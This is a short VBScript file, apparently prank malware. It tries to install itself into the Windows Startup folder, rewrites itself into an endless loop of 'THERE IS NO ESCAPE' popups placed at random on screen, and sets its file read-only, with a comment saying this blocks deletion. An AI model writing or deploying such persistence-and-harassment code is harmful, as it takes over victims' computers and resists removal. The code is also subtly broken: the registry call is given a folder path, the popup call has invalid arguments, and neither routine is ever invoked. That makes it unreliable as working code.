Const SW_HIDE = 0
Const SW_SHOWMINNOACTIVE = 7

Const SCREEN_WIDTH = 1920
Const SCREEN_HEIGHT = 1080

Set objShell = CreateObject("WScript.Shell")
strScriptPath = WScript.ScriptFullName

Sub CreateStartupEntry()
    Dim objShell, strStartupPath, strScriptName
    Set objShell = CreateObject("WScript.Shell")
    strStartupPath = objShell.ExpandEnvironmentStrings("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
    strScriptName = "popup.vbs"
    objShell.RegWrite strStartupPath & strScriptName, strScriptPath, "REG_SZ"
End Sub

Sub CreateScriptFile()
    Dim objFSO, objFile
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objFile = objFSO.CreateTextFile(strScriptPath)
    objFile.Write _
    "Const SW_HIDE = 0" & vbCrLf & _
    "Const SW_SHOWMINNOACTIVE = 7" & vbCrLf & _
    "Const SCREEN_WIDTH = 1920" & vbCrLf & _
    "Const SCREEN_HEIGHT = 1080" & vbCrLf & vbCrLf & _
    "Set objShell = CreateObject(""WScript.Shell"")" & vbCrLf & _
    "Do" & vbCrLf & _
    "   leftPos = Int(SCREEN_WIDTH * Rnd)" & vbCrLf & _
    "   topPos = Int(SCREEN_HEIGHT * Rnd)" & vbCrLf & vbCrLf & _
    "   objShell.Popup ""THERE IS NO ESCAPE"", , , , , SW_HIDE, leftPos, topPos" & vbCrLf & _
    "   WScript.Sleep 1000" & vbCrLf & _
    "Loop"
    objFile.Close
    ' Set the read-only attribute to prevent deletion
    objFSO.GetFile(strScriptPath).Attributes = objFSO.GetFile(strScriptPath).Attributes Or 1 ' 1 represents read-only attribute
End Sub
